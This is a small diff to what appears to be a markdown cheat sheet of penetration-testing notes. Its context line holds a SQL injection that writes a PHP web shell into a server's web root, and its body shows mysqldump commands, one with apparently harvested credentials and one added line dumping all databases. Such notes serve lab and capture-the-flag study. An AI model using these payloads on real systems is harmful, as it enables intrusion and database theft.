@@ -243,6 +243,8 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshe
 ### mysqldump
 ```bash
 mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
+
+mysqldump -u user --all-databases > db.sql
 ```
 
 </details>
